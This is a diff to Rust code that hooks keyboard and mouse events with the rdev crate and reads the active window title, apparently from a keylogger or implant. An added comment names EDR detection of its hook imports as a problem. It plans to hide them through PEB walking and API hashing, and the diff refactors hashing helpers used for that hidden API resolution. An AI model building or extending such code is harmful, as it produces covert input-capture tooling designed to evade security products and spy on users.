@@ -13,6 +13,13 @@
 
 use chrono::Utc;
 use lazy_static::lazy_static;
+// P1-01 SECURITY WARNING: The `rdev` crate links against user32.dll with static
+// IAT imports for keyboard/mouse hook functions (SetWindowsHookExW, etc.).
+// This creates detectable IAT entries that an EDR can flag.
+//
+// TODO: Fork/vendor rdev and replace its static user32 imports with
+// pe_resolve-based runtime resolution, or implement a custom raw input
+// listener that resolves all APIs dynamically via PEB walking + API hashing.
 use rdev::{listen, Event, EventType};
 use serde::Serialize;
 use std::collections::VecDeque;
@@ -550,24 +557,7 @@ fn get_active_window_title() -> Result<String, String> {
     use std::os::windows::ffi::OsStringExt;
 
     // ── pe_resolve helpers ────────────────────────────────────────────────
-    const fn hash_str_const(s: &[u8]) -> u32 {
-        let mut h: u32 = pe_resolve::SEED;
-        let mut i = 0;
-        while i < s.len() {
-            h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
-            i += 1;
-        }
-        h
-    }
-    const fn hash_wstr_const(w: &[u16]) -> u32 {
-        let mut h: u32 = pe_resolve::SEED;
-        let mut i = 0;
-        while i < w.len() {
-            h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
-            i += 1;
-        }
-        h
-    }
+    use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
     unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
         let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
             Some(m) => m,
